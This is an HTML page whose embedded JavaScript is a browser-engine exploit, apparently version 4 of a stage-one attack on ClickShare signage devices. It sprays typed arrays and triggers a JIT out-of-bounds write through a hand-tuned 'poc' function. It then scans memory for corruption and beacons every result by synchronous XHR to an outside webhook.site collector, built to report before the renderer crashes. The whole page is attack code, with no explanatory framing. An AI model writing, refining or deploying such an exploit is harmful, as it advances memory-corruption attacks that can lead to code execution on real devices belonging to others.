<html><body><script>
// ClickShare signage -- stage 1 v4. KEY FIX: beacons via SYNCHRONOUS XHR, so every result is
// delivered BEFORE the (expected) renderer crash. Proven PoC kept byte-for-byte.
// Evidence base: device log shows "MainScreenItemRenderer::onWebView" + "crash detected" every ~180ms
// => webengine DOES start; it dies on our PoC before async beacons can flush.
const SINK = 'https://webhook.site/9b9f3ae6-9ca5-4a70-8d42-d9a45b78db92';
const MARKER = 1.2345678901234e-300;
function beacon(t, v){
  try {                                   // SYNC: returns only after the request is on the wire
    var x = new XMLHttpRequest();
    x.open('GET', SINK + '?t=' + encodeURIComponent(t) + '&v=' + encodeURIComponent(String(v).slice(0,150)), false);
    x.send();
  } catch(e) {}
}
beacon('V4-start', navigator.userAgent.slice(0,80));
try {
  const VICT = 800, VLEN = 64;
  var spray = new Array(VICT);
  for (let i = 0; i < VICT; i++) { spray[i] = new Float64Array(VLEN); spray[i][0] = 1.1; }
  beacon('V4-spray-done', VICT);

  var fake = new Uint32Array(10);
  for (var i=0;i<9;i++) fake[i] = i+1;
  fake[0]=1; fake[1]=3; fake[2]=2; fake[3]=4; fake[4]=5; fake[5]=6; fake[6]=7; fake[7]=8; fake[8]=9;
  var tahir = 0x1;
  function poc(a) {
    var oob_array = new Array(5); oob_array[0] = 0x500;
    let just_a_variable = fake[0];
    let another_variable3 = fake[7];
    if (a % 7 == 0) another_variable3 = 0xff00000000;
    another_variable3 = Math.max(another_variable3, tahir);
    another_variable3 = another_variable3 >>> 0;
    var index = fake[3];
    var for_phi_modes = fake[6];
    let c = fake[1];
    for (var i = 0; i < 10; i++) {
      if (a % 3 == 0) just_a_variable = c;
      if (a % 37 == 0) just_a_variable = fake[2];
      if (a % 11 == 0) just_a_variable = fake[8];
      if (a % 17 == 0) just_a_variable = fake[5];
      if (a % 19 == 0) just_a_variable = fake[4];
      if (a % 7 == 0 && i >= 5) { for_phi_modes = just_a_variable; just_a_variable = another_variable3; }
      if (i >= 6) { for (let j = 0; j < 5; j++) { if (a % 5 == 0) { index = for_phi_modes; oob_array[index] = MARKER; } } }
      for_phi_modes = c; c = just_a_variable;
    }
    return [index, BigInt(just_a_variable)];
  }
  var hits = 0;
  function sweep(tag){
    for (let k = 0; k < VICT; k++) {
      var a = spray[k];
      if (a.length !== VLEN) { if (hits < 10) beacon('HIT-len', 'at='+tag+' k='+k+' len='+a.length); hits++; continue; }
      for (let j = 0; j < VLEN; j++) { if (a[j] === MARKER) { if (hits < 10) beacon('HIT-mark', 'at='+tag+' k='+k+' j='+j); hits++; break; } }
    }
    beacon('V4-iter', 'at='+tag+' hits='+hits);
  }
  // phase 1: warm-up (this is where the OOB write can already land) -> sweep while still alive
  for (let i = 2; i < 0x500; i++) poc(i);
  beacon('V4-warm-done','ok');
  sweep('warm');
  for (let i = 0; i < 20000; i++) poc(i % 500 + 2);
  beacon('V4-warm20k-done','ok');
  sweep('warm20k');
  // phase 2: the fatal triggers, sweep between each (sync beacons guarantee the result survives)
  let triggers = [35, 70, 105];
  for (let t = 0; t < triggers.length; t++) {
    beacon('V4-fire', 'a=' + triggers[t]);
    poc(triggers[t]);
    sweep('a' + triggers[t]);
  }
  beacon('V4-SURVIVED', 'hits=' + hits);
} catch (e) { beacon('V4-exc', String(e).slice(0,120)); }
beacon('V4-done','end-of-page');
</script></body></html>
